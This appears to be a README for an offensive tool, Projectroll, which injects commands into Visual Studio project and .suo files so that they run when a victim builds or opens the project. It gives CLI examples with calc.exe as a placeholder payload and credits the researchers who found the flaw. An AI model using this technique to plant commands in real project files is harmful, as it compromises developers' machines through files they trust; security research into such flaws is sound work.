# Projectroll

**Projectroll** exploits vulnerabilities in Visual Studio triggers, targeting project files like `.sln` and `.vcxproj`/`.csproj`. It demonstrates how arbitrary commands can be executed without compilation, revealing security risks in the development environment.

## Features

### 1. **Using triggers**

Executes arbitrary commands with when the specified input trigger is activated (ex: `GetFrameworkPaths`, `Compile`, `BeforeBuild`)

(CLI) Example of **Module 1 (Project)** usage: 
```
projectroll --module=1 --path=C:\Anywhere\Project**.csproj** --trigger=Compile --command="start calc.exe" --ps=false <-- Opens calc.exe when the user compiles project.
```
(CLI) Example of **Module 2 (Compiled Suo)** usage:
```
projectroll --module=2 --path=C:\Anywhere\**.suo** --command="cmd /c start calc.exe" <-- Opens calc.exe when the user compiles project.
```

## Credits
The vulnerability has been discovered by cjm00n & edwardzpeng (https://x.com/edwardzpeng)

VisualStudio .suo deserialization exploit - https://github.com/moom825/visualstudio-suo-exploit
